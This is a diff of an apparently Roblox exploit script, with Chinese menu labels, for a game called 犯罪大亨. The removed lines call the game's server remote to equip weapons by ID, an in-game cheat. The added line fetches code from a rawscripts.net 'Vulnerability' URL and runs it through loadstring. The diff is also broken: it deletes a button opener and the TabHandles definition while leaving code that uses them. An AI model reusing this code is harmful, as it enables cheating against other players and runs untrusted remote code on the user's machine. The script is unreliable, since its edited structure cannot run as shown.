@@ -618,7 +618,6 @@ local Tab = Window:Tab({
     Locked = false,
 })
 
-local Button = Tab:Button({
     Title = "自动锻炼",
     Desc = "要拿锻炼工具",
     Locked = false,
@@ -640,97 +639,10 @@ local Tabs = {
     Main = Window:Section({ Title = "犯罪大亨", Opened = true }),
 }
     
-local TabHandles = {
-    Elements = Tabs.Main:Tab({ Title = "装备枪", Icon = "layout-grid", Desc = "装备枪" }),
-}
-
-local Button = Tab:Button({
-    Title = "散弹枪",
-    Desc = "",
-    Locked = false,
+TabHandles.Elements:Button({
+    Title = "Show Notification",
+    Icon = "bell",
     Callback = function()
-    local args = {
-	6,
-	1
-}
-game:GetService("ReplicatedStorage"):WaitForChild("KnitFolder"):WaitForChild("Knit"):WaitForChild("Services"):WaitForChild("FirearmService"):WaitForChild("RF"):WaitForChild("Equip"):InvokeServer(unpack(args))
-    end
-})
-
-local Button = Tab:Button({
-    Title = "AK47",
-    Desc = "",
-    Locked = false,
-    Callback = function()
-    local args = {
-	1,
-	1
-}
-game:GetService("ReplicatedStorage"):WaitForChild("KnitFolder"):WaitForChild("Knit"):WaitForChild("Services"):WaitForChild("FirearmService"):WaitForChild("RF"):WaitForChild("Equip"):InvokeServer(unpack(args))
-    end
-})
-
-local Button = Tab:Button({
-    Title = "M16",
-    Desc = "",
-    Locked = false,
-    Callback = function()
-    local args = {
-	9,
-	1
-}
-game:GetService("ReplicatedStorage"):WaitForChild("KnitFolder"):WaitForChild("Knit"):WaitForChild("Services"):WaitForChild("FirearmService"):WaitForChild("RF"):WaitForChild("Equip"):InvokeServer(unpack(args))
-    end
-})
-
-local Button = Tab:Button({
-    Title = "QBZ",
-    Desc = "",
-    Locked = false,
-    Callback = function()
-    local args = {
-	4,
-	1
-}
-game:GetService("ReplicatedStorage"):WaitForChild("KnitFolder"):WaitForChild("Knit"):WaitForChild("Services"):WaitForChild("FirearmService"):WaitForChild("RF"):WaitForChild("Equip"):InvokeServer(unpack(args))
-    end
-})
-
-local Button = Tab:Button({
-    Title = "乌兹",
-    Desc = "",
-    Locked = false,
-    Callback = function()
-    local args = {
-	14,
-	1
-}
-game:GetService("ReplicatedStorage"):WaitForChild("KnitFolder"):WaitForChild("Knit"):WaitForChild("Services"):WaitForChild("FirearmService"):WaitForChild("RF"):WaitForChild("Equip"):InvokeServer(unpack(args))
-    end
-})
-
-local Button = Tab:Button({
-    Title = "伤害5",
-    Desc = "",
-    Locked = false,
-    Callback = function()
-    local args = {
-	11,
-	1
-}
-game:GetService("ReplicatedStorage"):WaitForChild("KnitFolder"):WaitForChild("Knit"):WaitForChild("Services"):WaitForChild("FirearmService"):WaitForChild("RF"):WaitForChild("Equip"):InvokeServer(unpack(args))
-    end
-})
-
-local Button = Tab:Button({
-    Title = "M9",
-    Desc = "",
-    Locked = false,
-    Callback = function()
-    local args = {
-	10,
-	1
-}
-game:GetService("ReplicatedStorage"):WaitForChild("KnitFolder"):WaitForChild("Knit"):WaitForChild("Services"):WaitForChild("FirearmService"):WaitForChild("RF"):WaitForChild("Equip"):InvokeServer(unpack(args))
+    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-FE-Ac6-Music-Vulnerability-25536"))()
     end
 })
